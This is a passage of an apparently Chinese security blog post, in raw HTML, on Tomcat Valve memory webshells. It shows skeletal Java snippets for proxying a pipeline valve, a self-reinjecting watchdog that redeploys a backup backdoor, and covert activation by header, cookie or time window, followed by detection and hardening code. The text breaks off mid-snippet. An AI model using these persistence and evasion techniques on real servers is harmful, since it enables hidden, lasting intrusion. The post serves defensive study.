</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">original</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 替换原始Valve</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">replaceOriginalValve</span><span class="p">(</span><span class="n">Pipeline</span><span class="w"> </span><span class="n">pipeline</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Valve</span><span class="o">[]</span><span class="w"> </span><span class="n">valves</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipeline</span><span class="p">.</span><span class="na">getValves</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">valves</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">valves</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="k">instanceof</span><span class="w"> </span><span class="n">AccessLogValve</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">valves</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">AccessLogValveProxy</span><span class="p">(</span><span class="n">valves</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">break</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="2-自保护机制">2. 自保护机制<a hidden class="anchor" aria-hidden="true" href="#2-自保护机制">#</a></h3>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span><span class="lnt" id="25"><a class="lnlinks" href="#25">25</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 在Valve中添加自检和恢复逻辑</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">Response</span><span class="w"> </span><span class="n">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 1. 检查自身是否仍在管道中</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isValveInPipeline</span><span class="p">(</span><span class="k">this</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">reinjectSelf</span><span class="p">();</span><span class="w"> </span><span class="c1">// 重新注入</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 2. 检查其他内存马是否存在</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isBackdoorPresent</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">deploySecondaryBackdoor</span><span class="p">();</span><span class="w"> </span><span class="c1">// 部署备用后门</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 3. 正常恶意逻辑...</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 定时检查线程</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">startWatchdog</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Thread</span><span class="p">(()</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">checkValveStatus</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">checkSecurityTools</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Thread</span><span class="p">.</span><span class="na">sleep</span><span class="p">(</span><span class="n">300000</span><span class="p">);</span><span class="w"> </span><span class="c1">// 5分钟检查一次</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}).</span><span class="na">start</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="3-上下文感知触发">3. 上下文感知触发<a hidden class="anchor" aria-hidden="true" href="#3-上下文感知触发">#</a></h3>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span><span class="lnt" id="20"><a class="lnlinks" href="#20">20</a>
</span><span class="lnt" id="21"><a class="lnlinks" href="#21">21</a>
</span><span class="lnt" id="22"><a class="lnlinks" href="#22">22</a>
</span><span class="lnt" id="23"><a class="lnlinks" href="#23">23</a>
</span><span class="lnt" id="24"><a class="lnlinks" href="#24">24</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">// 基于请求上下文动态激活</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">shouldActivate</span><span class="p">(</span><span class="n">Request</span><span class="w"> </span><span class="n">request</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 1. 检查特定Header</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="na">getHeader</span><span class="p">(</span><span class="s">&#34;X-Health-Check&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 2. 检查特殊URL模式</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">uri</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getRequestURI</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">uri</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;;jsessionid=&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">sessionPart</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">uri</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;;&#34;</span><span class="p">)</span><span class="o">[</span><span class="n">1</span><span class="o">]</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">validateSessionToken</span><span class="p">(</span><span class="n">sessionPart</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 3. 检查特定Cookie值</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Cookie</span><span class="o">[]</span><span class="w"> </span><span class="n">cookies</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getCookies</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Cookie</span><span class="w"> </span><span class="n">cookie</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">cookies</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s">&#34;debug_mode&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">cookie</span><span class="p">.</span><span class="na">getName</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="n">checkCookieSignature</span><span class="p">(</span><span class="n">cookie</span><span class="p">.</span><span class="na">getValue</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 4. 时间窗口激活</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">currentTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">currentTimeMillis</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">currentTime</span><span class="w"> </span><span class="o">%</span><span class="w"> </span><span class="n">60000</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">5000</span><span class="p">;</span><span class="w"> </span><span class="c1">// 每分钟激活5秒</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h3 id="四检测与防御方案">四、检测与防御方案<a hidden class="anchor" aria-hidden="true" href="#四检测与防御方案">#</a></h3>
<p><strong>检测技术</strong></p>
<ol>
<li>
<p><strong>运行时管道分析</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">monitorValves</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getCurrentContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Pipeline</span><span class="w"> </span><span class="n">pipeline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="na">getPipeline</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Valve</span><span class="o">[]</span><span class="w"> </span><span class="n">valves</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipeline</span><span class="p">.</span><span class="na">getValves</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">Valve</span><span class="w"> </span><span class="n">valve</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">valves</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 检测未签名的Valve</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">isSigned</span><span class="p">(</span><span class="n">valve</span><span class="p">.</span><span class="na">getClass</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">alertSuspiciousValve</span><span class="p">(</span><span class="n">valve</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 检测类加载来源</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">valve</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">ctx</span><span class="p">.</span><span class="na">getLoader</span><span class="p">().</span><span class="na">getClassLoader</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">alertForeignClassLoader</span><span class="p">(</span><span class="n">valve</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>字节码校验技术</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">text</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># 使用jvmti代理进行类校验
</span></span><span class="line"><span class="cl">java -agentpath:valve_checker.so=org.apache.catalina.core.StandardPipeline ...</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
</ol>
<p><strong>防御策略</strong></p>
<ol>
<li>
<p><strong>Tomcat配置加固</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">xml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2">2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3">3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4">4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5">5</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="c">&lt;!-- context.xml --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;Context&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="nt">&lt;Valve</span> <span class="na">className=</span><span class="s">&#34;org.apache.catalina.valves.ValveSecurityFilter&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">allowedValves=</span><span class="s">&#34;org.apache.catalina.valves.*&#34;</span> <span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/Context&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div></li>
<li>
<p><strong>运行时保护机制</strong></p>
<div class="code-block-container" data-expanded="true">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" title="Toggle">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
</span><span class="lnt" id="16"><a class="lnlinks" href="#16">16</a>
</span><span class="lnt" id="17"><a class="lnlinks" href="#17">17</a>
</span><span class="lnt" id="18"><a class="lnlinks" href="#18">18</a>
</span><span class="lnt" id="19"><a class="lnlinks" href="#19">19</a>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">ValveProtectionAgent</span><span class="w"> </span><span class="p">{</span><span class="w">
